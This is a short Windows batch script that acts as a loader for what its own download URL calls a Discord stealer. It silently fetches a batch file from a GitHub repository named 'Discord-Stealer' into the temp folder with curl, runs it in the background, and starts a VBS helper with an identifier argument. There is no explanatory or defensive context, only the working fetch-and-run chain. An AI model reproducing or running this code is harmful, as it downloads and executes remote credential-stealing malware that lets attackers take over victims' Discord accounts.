@echo off
set Identifier=%~1
set "Save=%temp%\"
curl --create-dirs -sf#kLo "%Save%DAS.bat" "https://raw.githubusercontent.com/agamsol/Discord-Stealer/main/2.0/DAS.bat"
call "%Save%DAS.bat" --Background
call "%Save%background.vbs" "%Save%DAS.bat" "!Identifier!"
exit /b
